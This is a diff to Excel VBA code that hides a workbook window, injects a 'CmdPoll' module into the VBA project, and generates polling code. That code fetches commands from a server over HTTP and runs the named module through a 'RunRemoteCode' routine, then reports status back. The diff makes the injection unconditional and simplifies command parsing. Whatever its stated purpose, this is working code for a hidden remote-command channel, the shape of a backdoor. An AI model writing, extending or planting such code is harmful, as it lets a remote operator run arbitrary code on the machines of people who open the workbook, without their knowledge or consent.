@@ -33,9 +33,8 @@ Private Sub EnsurePollHost()
         On Error Resume Next
         wb.Windows(1).Visible = False
         On Error GoTo 0
-        If Not PollModuleExists(wb) Then InjectPollModule wb
     End If
-
+    InjectPollModule wb
     SchedulePollTick wb
 End Sub
 
@@ -47,14 +46,6 @@ Private Function FindOpenPollHost() As Workbook
             Exit Function
         End If
     Next wb
-End Function
-
-Private Function PollModuleExists(wb As Workbook) As Boolean
-    On Error Resume Next
-    Dim vbComp As Object
-    Set vbComp = wb.VBProject.VBComponents("CmdPoll")
-    PollModuleExists = (Err.Number = 0)
-    Err.Clear
 End Function
 
 Private Sub SchedulePollTick(wb As Workbook)
@@ -72,6 +63,9 @@ End Sub
 
 Private Sub InjectPollModule(wb As Workbook)
     Dim vbComp As Object
+    On Error Resume Next
+    wb.VBProject.VBComponents.Remove wb.VBProject.VBComponents("CmdPoll")
+    On Error GoTo 0
     Set vbComp = wb.VBProject.VBComponents.Add(1)
     vbComp.Name = "CmdPoll"
     vbComp.CodeModule.AddFromString GetPollModuleCode()
@@ -103,22 +97,20 @@ Private Function PollCodeMain() As String
     s = s & "    http.send" & vbCrLf
     s = s & "    If http.Status = 200 Then" & vbCrLf
     s = s & "        Dim resp As String : resp = http.responseText" & vbCrLf
-    s = s & "        If InStr(resp, ""data"":null"") = 0 And InStr(resp, ""moduleName"") > 0 Then" & vbCrLf
-    s = s & "            Dim cmdId As String : cmdId = JsonVal(resp, ""id"")" & vbCrLf
-    s = s & "            Dim modName As String : modName = JsonStr(resp, ""moduleName"")" & vbCrLf
-    s = s & "            Dim cmdParam As String : cmdParam = JsonStr(resp, ""param"")" & vbCrLf
-    s = s & "            If Len(cmdId) > 0 And Len(modName) > 0 Then" & vbCrLf
-    s = s & "                Err.Clear" & vbCrLf
-    s = s & "                If Len(cmdParam) > 0 Then" & vbCrLf
-    s = s & "                    Application.Run ""zInternet.RunRemoteCode"", modName, cmdParam" & vbCrLf
-    s = s & "                Else" & vbCrLf
-    s = s & "                    Application.Run ""zInternet.RunRemoteCode"", modName" & vbCrLf
-    s = s & "                End If" & vbCrLf
-    s = s & "                If Err.Number <> 0 Then" & vbCrLf
-    s = s & "                    PatchDone baseUrl, cmdId, ""error"", """", Err.Description" & vbCrLf
-    s = s & "                Else" & vbCrLf
-    s = s & "                    PatchDone baseUrl, cmdId, ""done"", ""OK"", """"" & vbCrLf
-    s = s & "                End If" & vbCrLf
+    s = s & "        Dim cmdId As String : cmdId = JsonVal(resp, ""id"")" & vbCrLf
+    s = s & "        Dim modName As String : modName = JsonStr(resp, ""moduleName"")" & vbCrLf
+    s = s & "        Dim cmdParam As String : cmdParam = JsonStr(resp, ""param"")" & vbCrLf
+    s = s & "        If Len(cmdId) > 0 And Len(modName) > 0 And cmdId <> ""null"" Then" & vbCrLf
+    s = s & "            Err.Clear" & vbCrLf
+    s = s & "            If Len(cmdParam) > 0 Then" & vbCrLf
+    s = s & "                Application.Run ""zInternet.RunRemoteCode"", modName, cmdParam" & vbCrLf
+    s = s & "            Else" & vbCrLf
+    s = s & "                Application.Run ""zInternet.RunRemoteCode"", modName" & vbCrLf
+    s = s & "            End If" & vbCrLf
+    s = s & "            If Err.Number <> 0 Then" & vbCrLf
+    s = s & "                PatchDone baseUrl, cmdId, ""error"", """", Err.Description" & vbCrLf
+    s = s & "            Else" & vbCrLf
+    s = s & "                PatchDone baseUrl, cmdId, ""done"", ""OK"", """"" & vbCrLf
     s = s & "            End If" & vbCrLf
     s = s & "        End If" & vbCrLf
     s = s & "    End If" & vbCrLf
